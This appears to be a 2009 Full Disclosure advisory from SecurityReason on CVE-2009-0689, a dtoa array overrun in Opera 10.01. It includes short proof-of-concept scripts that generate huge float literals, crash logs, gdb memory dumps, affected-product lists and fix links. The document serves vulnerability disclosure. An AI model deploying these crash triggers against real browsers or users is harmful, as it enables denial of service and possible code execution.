@@ -1,0 +1,221 @@
+From Full Disclosure:  http://seclists.org/fulldisclosure/2009/Nov/223
+
+[ Opera 10.01 Remote Array Overrun (Arbitrary code execution) ]
+
+Author: Maksymilian Arciemowicz and sp3x
+http://SecurityReason.com
+Date:
+- - Dis.: 07.05.2009
+- - Pub.: 20.11.2009
+
+CVE: CVE-2009-0689
+Risk: High
+Remote: Yes
+
+Affected Software:
+- - Opera 10.01
+- - Opera 10.10 Beta
+
+NOTE: Prior versions may also be affected.
+
+Original URL:
+http://securityreason.com/achievement_securityalert/73
+
+
+- --- 0.Description ---
+Opera is a Web browser and Internet suite developed by the Opera
+Software company. The browser handles common Internet-related tasks such
+as displaying Web sites, sending and receiving e-mail messages, managing
+contacts, IRC online chatting, downloading files via BitTorrent, and
+reading Web feeds. Opera is offered free of charge for personal
+computers and mobile phones.
+
+
+- --- 1. Opera 10.01 Remote Array Overrun (Arbitrary code execution) ---
+The main problem exist in dtoa implementation. Opera has a very similar
+dtoa algorithm to the BSD, Chrome and Mozilla products. It is the same
+issue like SREASONRES:20090625.
+
+http://securityreason.com/achievement_securityalert/63
+
+but fix for SREASONRES:20090625, used by openbsd was not good.
+More information about fix for openbsd and similars SREASONRES:20091030,
+
+http://securityreason.com/achievement_securityalert/69
+
+We can create any number of float, which will overwrite the memory. In
+Kmax has defined 15. Functions in dtoa, don't checks Kmax limit, and it
+is possible to call 16<= elements of freelist array.
+
+
+- --- 2. Proof of Concept  (PoC) ---
+
+- -----------------------
+<script>
+var a=0.<?php echo str_repeat("9",299999); ?>;
+</script>
+- -----------------------
+
+If we use Opera to see this PoC, Opera will crash. For example
+
+- -----------------------
+<script>
+var a=0.<?php echo str_repeat("1",296450); ?>;
+</script>
+- -----------------------
+
+OPERA-CRASHLOG V1 desktop 10.01 1844 windows
+Opera.exe 1844 caused exception C0000005 at address 67956906 (Base: 400000)
+
+Registers:
+EAX=01165C40   EBX=0592064C   ECX=A0D589D4   EDX=42000000   ESI=C20471EC
+EDI=00000000   EBP=0012E384   ESP=0012E2FC   EIP=67956906 FLAGS=00010202
+CS=001B   DS=0023   SS=0023   ES=0023   FS=003B   GS=0000
+FPU stack:
+C020A38F66534266F000 C020A38F66534266F000 3FFBE38E38E38E38D800
+3FC78000000000000000 10000000000100000000 0BBE0000000000040000
+00000000000000000000 2EBA804E2FDE00000000 SW=0122 CW=027F
+
+127# gdb -q opera opera.core
+...
+Program terminated with signal 11, Segmentation fault.
+#0  0x2960307b in ?? ()
+...
+(gdb) i r
+eax            0x71c71c71       1908874353
+ecx            0x2aa03be4       715144164
+edx            0x0      0
+ebx            0x296177f8       694253560
+esp            0xbfbfb650       0xbfbfb650
+ebp            0xbfbfb698       0xbfbfb698
+esi            0x2962d000       694341632
+edi            0x0      0
+eip            0x2960307b       0x2960307b
+...
+(gdb) x/100x ($esi)-90
+0x2962cfa6:     0x71c71c71      0x1c71c71c      0xc71c71c7      0x71c71c71
+0x2962cfb6:     0x1c71c71c      0xc71c71c7      0x71c71c71      0x1c71c71c
+0x2962cfc6:     0xc71c71c7      0x71c71c71      0x1c71c71c      0xc71c71c7
+0x2962cfd6:     0x71c71c71      0x1c71c71c      0xc71c71c7      0x71c71c71
+0x2962cfe6:     0x1c71c71c      0xc71c71c7      0x71c71c71      0x1c71c71c
+0x2962cff6:     0xc71c71c7      0x71c71c71      Cannot access memory at
+address 0x2962cffe
+...
+
+
+- --- 3. SecurityReason Note ---
+
+Officialy SREASONRES:20090625 has been detected in:
+- - OpenBSD
+- - NetBSD
+- - FreeBSD
+- - MacOSX
+- - Google Chrome
+- - Mozilla Firefox
+- - Mozilla Seamonkey
+- - KDE (example: konqueror)
+- - Opera
+- - K-Meleon
+
+This list is not yet closed. US-CERT declared that will inform all
+vendors about this issue, however, they did not do it. Even greater
+confusion caused new CVE number "CVE-2009-1563". Secunia has informed
+that this vulnerability was only detected in Mozilla Firefox, but nobody
+was aware that the problem affects other products like ( KDE, Chrome )
+and it is based on "CVE-2009-0689". After some time Mozilla Foundation
+Security Advisory
+("http://www.mozilla.org/security/announce/2009/mfsa2009-59.html";)
+was updated with note :
+"The underlying flaw in the dtoa routines used by Mozilla appears to be
+essentially the same as that reported against the libc gdtoa routine by
+Maksymilian Arciemowicz ( CVE-2009-0689)".
+This fact ( new CVE number for Firefox Vulnerability )and PoC in
+javascript (from Secunia), forced us to official notification all other
+vendors. We publish all the individual advisories, to formally show all
+vulnerable software and to avoid wrong CVE number. We do not see any
+other way to fix this issue in all products.
+
+
+- --- 4. Fix ---
+Opera fix:
+The vulnerability was fixed in the latest release candidate Opera RC3 :
+http://snapshot.opera.com/windows/Opera_1010_1890_in.exe
+In shortly time we can expect the final verion of Opera with the fix.
+
+NetBSD fix (optimal):
+http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gdtoa/gdtoaimp.h
+
+OpenBSD fix:
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/sum.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorx.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtord.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorQ.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtof.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodg.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtod.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/smisc.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/misc.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/hdtoa.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/gethex.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/gdtoa.h
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/dtoa.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/dmisc.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdio/vfprintf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/arch/vax/gdtoa/strtof.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorxL.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtordd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopxL.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopx.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopdd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopQ.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodnrp.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodI.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIxL.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIx.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIg.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIdd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoId.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIQ.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/qnan.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_xfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_xLfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_ffmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_dfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_ddfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g__fmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_Qfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/arithchk.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/gcvt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/ecvt.c
+
+
+- --- 5. Credits ---
+Discovered by Maksymilian Arciemowicz and sp3x from SecurityReason.com.
+
+
+- --- 6. Greets ---
+Infospec p_e_a pi3
+
+
+- --- 7. Contact ---
+Email:
+- - cxib {a.t] securityreason [d0t} com
+- - sp3x {a.t] securityreason [d0t} com
+
+GPG:
+- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+- - http://securityreason.com/key/sp3x.gpg
+
+http://securityreason.com/
+http://securityreason.pl/
+
+-----BEGIN PGP SIGNATURE-----
+
+iEYEARECAAYFAksF4esACgkQpiCeOKaYa9bOkQCcDLKKqvSyE1ZJZebhBBiow8tV
+XqQAnR79bagErDfzJ3TV/MlLgrWXsGD7
+=/IkD
+-----END PGP SIGNATURE-----
